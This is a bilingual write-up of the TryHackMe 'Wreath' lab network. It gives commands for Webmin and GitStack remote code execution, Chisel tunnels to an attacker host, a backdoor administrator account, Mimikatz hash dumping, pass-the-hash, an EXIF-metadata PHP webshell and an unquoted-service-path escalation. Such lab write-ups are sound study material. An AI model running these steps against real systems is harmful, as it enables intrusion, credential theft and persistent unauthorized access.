# TryHackMe - Wreath

## Target Metadata

| Field | Value |
|---|---|
| Platform | TryHackMe |
| Room | Wreath |
| Path | Networks |
| Initial host | `10.200.180.200` |
| Domain | `thomaswreath.thm` |
| First OS | CentOS / Linux |
| Internal hosts | `10.200.180.150`, `10.200.180.100` |
| Main services | Webmin, SSH, GitStack, WinRM, RDP, PHP web app |

## Attack Chain Overview

```text
10.200.180.200 Webmin CVE-2019-15107 RCE
  -> root shell and SSH key
  -> internal discovery
  -> Chisel reverse SOCKS pivot
  -> 10.200.180.150 GitStack 2.3.10 RCE
  -> Windows admin shell
  -> WinRM/RDP stabilization
  -> Mimikatz SAM dump and pass-the-hash
  -> Chisel remote port forward to 10.200.180.100
  -> recover Website.git
  -> PHP upload filter bypass with ExifTool metadata webshell
  -> Windows service enumeration
  -> unquoted service path / writable service directory
  -> SYSTEM shell
```

## Tabla de Contenidos / Table of Contents

1. [Resumen en Espanol](#resumen-en-espanol)
2. [English Summary](#english-summary)
3. [Reconnaissance](#reconnaissance)
4. [Initial Access - Webmin](#initial-access---webmin)
5. [Internal Pivoting](#internal-pivoting)
6. [GitStack RCE on 10.200.180.150](#gitstack-rce-on-10200180150)
7. [Windows Stabilization and Credentials](#windows-stabilization-and-credentials)
8. [Second Pivot to 10.200.180.100](#second-pivot-to-10200180100)
9. [PHP Upload Bypass](#php-upload-bypass)
10. [Privilege Escalation](#privilege-escalation)
11. [Key Takeaways](#key-takeaways)
12. [Related Notes](#related-notes)

## Resumen en Espanol

Wreath fue una red encadenada, no una unica maquina. La entrada inicial fue Webmin vulnerable en `10.200.180.200`, lo que dio una shell como root y permitio recuperar la clave SSH de root. Desde ahi se hizo descubrimiento interno y se monto un pivot con Chisel para acceder a `10.200.180.150`.

En `10.200.180.150`, GitStack 2.3.10 permitio RCE sin autenticacion mediante un exploit publico. Como esa maquina no podia conectar directamente a Kali, la reverse shell se encamino por un relay Chisel hacia la maquina intermedia. Con privilegios de administrador se creo un usuario operativo, se estabilizo el acceso por WinRM/RDP, se dumpearon hashes locales con Mimikatz y se reutilizo el hash NTLM de Administrator con pass-the-hash.

El ultimo salto fue hacia `10.200.180.100`. Se expuso su web interna con un remote port forward de Chisel, se extrajo `Website.git`, se reviso el historial y se encontro una subida PHP que validaba mal extensiones y metadata. Un payload PHP dentro del campo `Comment` de una imagen genero ejecucion de comandos. La escalada final abuso de un servicio Windows con ruta sin comillas y directorio escribible.

## English Summary

Wreath was a network chain rather than a single-host compromise. Initial access came from Webmin on `10.200.180.200` via CVE-2019-15107, yielding root and the root SSH private key. That foothold exposed the internal network and became the pivot point.

Chisel reverse SOCKS made `10.200.180.150` reachable. GitStack 2.3.10 was exploited through a public unauthenticated RCE, then the resulting Windows shell was upgraded into WinRM/RDP access. Local hashes were dumped with Mimikatz, and the Administrator NTLM hash was reused through Evil-WinRM pass-the-hash.

The final target, `10.200.180.100`, was reached through another Chisel remote port forward. The website Git repository revealed an upload filter weakness: a PHP payload stored in EXIF metadata and saved with a PHP extension executed as a webshell. Windows service enumeration then exposed a writable unquoted service path, which led to SYSTEM.

## Reconnaissance

Reusable commands were extracted into [nmap](../../../tools/recon/nmap.md), [proxychains](../../../tools/pivot/proxychains.md), [tcpdump](../../../tools/creds/tcpdump.md), and the enumeration playbooks.

```bash
ping $TARGET -c1
nmap -sS -p- -n -Pn --min-rate 5000 $TARGET -oN silent-web-server
nmap -sVC -p22,80,443,10000 $TARGET -oN service-web-server
echo "$TARGET thomaswreath.thm" | sudo tee -a /etc/hosts
```

Open services on `10.200.180.200`: SSH, HTTP, HTTPS, and Webmin/MiniServ `1.890` on port `10000`.

## Initial Access - Webmin

Full technique: [Webmin 1.890 RCE](../../../exploits/web-rce/webmin-cve-2019-15107-rce.md).

The Webmin service was vulnerable to unauthenticated RCE. The exploit returned a root shell, then the root SSH key was recovered for a stable foothold.

```bash
python3 CVE-2019-15107.py $TARGET
cat /root/.ssh/id_rsa
chmod 600 id_rsa
ssh -i id_rsa root@$TARGET
```

## Internal Pivoting

Full technique: [Chisel pivoting](../../../exploits/pivot/chisel-pivoting.md). Related tool notes: [chisel](../../../tools/pivot/chisel.md), [proxychains](../../../tools/pivot/proxychains.md), [FoxyProxy](../../../tools/pivot/foxyproxy.md), [sshuttle](../../../tools/pivot/sshuttle.md), [plink](../../../tools/pivot/plink.md), and [socat](../../../tools/pivot/socat.md).

The first pivot exposed the internal network through a reverse SOCKS tunnel:

```bash
# Kali
./chisel server -p 15000 --reverse &

# 10.200.180.200
./chisel client ATTACKER_IP:15000 R:socks &

# Kali through proxychains
proxychains nmap -sT -Pn -n 10.200.180.1-255 -oN scan
```

Important results:

```text
10.200.180.150
  80/tcp   open  http
  3389/tcp open  ms-wbt-server
  5357/tcp open  wsdapi
  5985/tcp open  wsman
```

## GitStack RCE on 10.200.180.150

Full technique: [GitStack 2.3.10 RCE](../../../exploits/web-rce/gitstack-rce.md).

GitStack was reachable on port `80` through the SOCKS pivot and was vulnerable to a public unauthenticated RCE. The exploit uploaded a PHP webshell and command execution was triggered with `curl`.

```bash
searchsploit gitstack
searchsploit -m 43777
dos2unix 43777.py
proxychains /usr/bin/python2 43777.py
proxychains curl -X POST http://10.200.180.150/web/exploit-tryzub.php --data-urlencode "a=whoami"
```

The host could not reach Kali directly, so the shell was relayed through `10.200.180.200`:

```bash
# 10.200.180.200
./chisel server -p 16000 --reverse &
firewall-cmd --zone=public --add-port=16000/tcp
firewall-cmd --zone=public --add-port=4444/tcp

# Kali
./chisel client 10.200.180.200:16000 R:4444:127.0.0.1:4444 &
rlwrap nc -lvnp 4444
```

## Windows Stabilization and Credentials

Full techniques: [Windows admin stabilization](../../../exploits/privesc-windows/windows-admin-stabilization.md), [Mimikatz SAM dump and pass-the-hash](../../../exploits/creds/mimikatz-sam-pth.md).

Once command execution landed as an administrator, a dedicated user was created for WinRM/RDP.

```cmd
net user tryzub Tryzub@ /add
net localgroup Administrators tryzub /add
net localgroup "Remote Management Users" tryzub /add
net user tryzub
```

```bash
proxychains evil-winrm -u tryzub -p 'Tryzub@' -i 10.200.180.150
proxychains xfreerdp /v:10.200.180.150 /u:tryzub /p:'Tryzub@' +clipboard /dynamic-resolution /drive:/usr/share/windows-resources,share /cert:ignore /sec:tls
```

Mimikatz was launched from the shared RDP drive, then local SAM hashes were dumped. The Administrator hash was reused through Evil-WinRM:

```cmd
\\tsclient\share\mimikatz\x64\mimikatz.exe
privilege::debug
token::elevate
log c:\windows\temp\mimikatz.log
lsadump::sam
```

```bash
proxychains evil-winrm -u Administrator -H 37db630168e5f82aafa8461e05c6bbd1 -i 10.200.180.150
```

## Second Pivot to 10.200.180.100

Full technique: [Chisel pivoting](../../../exploits/pivot/chisel-pivoting.md).

PowerShell Empire port-scanning scripts found ports `80` and `3389` on `10.200.180.100`, but Empire stager generation failed. Chisel was used instead.

```cmd
Invoke-Portscan -Hosts 10.200.180.100 -TopPorts 50
netsh advfirewall firewall add rule name="chisel-try" dir=in action=allow protocol=tcp localport=15001
```

```bash
# 10.200.180.200
./chisel-try server -p 16000 --reverse &
firewall-cmd --zone=public --add-port=15001/tcp

# 10.200.180.150
./chisel.exe client 10.200.180.200:16000 R:15001:10.200.180.100:80
```

The internal web app was then available through the pivot at:

```text
http://10.200.180.200:15001/
```

## PHP Upload Bypass

Full technique: [PHP EXIF metadata webshell upload](../../../exploits/web-rce/php-exiftool-comment-webshell.md). Related tool note: [GitTools](../../../tools/web/gittools.md).

The website source was recovered from `C:\GitStack\repositories\Website.git`. Reviewing the extracted commits showed an upload handler that did not safely validate PHP extensions when image metadata was present.

```cmd
Compress-Archive -Path C:\GitStack\repositories\Website.git -DestinationPath C:\Windows\Temp\website.zip
download website.zip
```

```bash
unzip website.zip -d ./repos
mv Website.git .git
git clone https://github.com/internetwache/GitTools
/home/kali/Desktop/tools/GitTools/Extractor/extractor.sh . Website_extracted
find . -name "*.php"
```

The working payload used a PHP webshell embedded in EXIF `Comment` metadata:

```bash
mv image.jpg image.jpeg.php
exiftool -Comment="$(cat /tmp/payload.php)" image.jpeg.php
```

```text
http://10.200.180.200:15001/resources/uploads/inocent.jpeg.php?wreath=whoami
```

## Privilege Escalation

Full techniques: [Windows unquoted service path](../../../exploits/privesc-windows/windows-unquoted-service-path.md), [Windows SAM hive dump](../../../exploits/creds/windows-sam-hive-dump.md). Related playbook: [Windows enumeration](../../../exploits/enumeration/windows-enumeration.md).

Manual service enumeration found `SystemExplorerHelpService` with a space-containing unquoted path under a directory writable by `BUILTIN\Users`.

```cmd
whoami /priv
whoami /groups
wmic service get name,displayname,pathname,startmode | findstr /v /i "C:\Windows"
sc qc SystemExplorerHelpService
powershell "get-acl -Path 'C:\Program Files (x86)\System Explorer' | format-list"
```

A small C# wrapper was compiled with Mono to execute `nc.exe`, placed in the vulnerable path, and triggered by restarting the service.

```bash
mcs Wrapper.cs
```

```cmd
sc stop SystemExplorerHelpService
sc start SystemExplorerHelpService
```

SAM/SYSTEM hive dumping was also captured for offline extraction:

```cmd
reg.exe save HKLM\SAM sam.bak
reg.exe save HKLM\SYSTEM system.bak
```

```bash
impacket-secretsdump -sam sam.bak -system system.bak LOCAL
```

## Key Takeaways

- ES: En redes tipo Wreath, el valor real del primer root es convertirlo en router operativo. EN: On network rooms, the first root shell is most valuable as a pivot point.
- ES: Chisel cubre SOCKS reverso y forwards remotos cuando SSH no basta. EN: Chisel handles reverse SOCKS and remote forwards when SSH is not enough.
- ES: GitStack RCE dio ejecucion, pero la conectividad de salida definio la tecnica de shell. EN: GitStack gave execution, but egress controls shaped the shell strategy.
- ES: RDP con drive sharing acelera transferencia de herramientas Windows. EN: RDP drive sharing is handy for Windows tooling transfer.
- ES: Revisar Git historico revelo la debilidad real de subida. EN: Git history review exposed the real upload weakness.
- ES: Unquoted service path solo importa si tambien puedes escribir o controlar la ruta. EN: Unquoted service paths matter when write permissions make binary planting possible.

## Related Notes

### Tools

- [nmap](../../../tools/recon/nmap.md)
- [curl](../../../tools/web/curl.md)
- [searchsploit](../../../tools/recon/searchsploit.md)
- [chisel](../../../tools/pivot/chisel.md)
- [proxychains](../../../tools/pivot/proxychains.md)
- [FoxyProxy](../../../tools/pivot/foxyproxy.md)
- [socat](../../../tools/pivot/socat.md)
- [plink](../../../tools/pivot/plink.md)
- [sshuttle](../../../tools/pivot/sshuttle.md)
- [evil-winrm](../../../tools/windows/evil-winrm.md)
- [xfreerdp](../../../tools/windows/xfreerdp.md)
- [mimikatz](../../../tools/windows/mimikatz.md)
- [PowerShell Empire](../../../tools/windows/powershell-empire.md)
- [GitTools](../../../tools/web/gittools.md)
- [exiftool](../../../tools/web/exiftool.md)
- [netcat](../../../tools/pivot/netcat.md)
- [impacket](../../../tools/windows/impacket.md)

### Exploits / Techniques

- [Webmin 1.890 RCE](../../../exploits/web-rce/webmin-cve-2019-15107-rce.md)
- [Chisel pivoting](../../../exploits/pivot/chisel-pivoting.md)
- [GitStack 2.3.10 RCE](../../../exploits/web-rce/gitstack-rce.md)
- [Windows admin stabilization](../../../exploits/privesc-windows/windows-admin-stabilization.md)
- [Mimikatz SAM dump and pass-the-hash](../../../exploits/creds/mimikatz-sam-pth.md)
- [PowerShell Empire hop listener](../../../exploits/pivot/powershell-empire-hop-listener.md)
- [PHP EXIF metadata webshell upload](../../../exploits/web-rce/php-exiftool-comment-webshell.md)
- [Windows unquoted service path](../../../exploits/privesc-windows/windows-unquoted-service-path.md)
- [Windows SAM hive dump](../../../exploits/creds/windows-sam-hive-dump.md)
- [Windows enumeration](../../../exploits/enumeration/windows-enumeration.md)
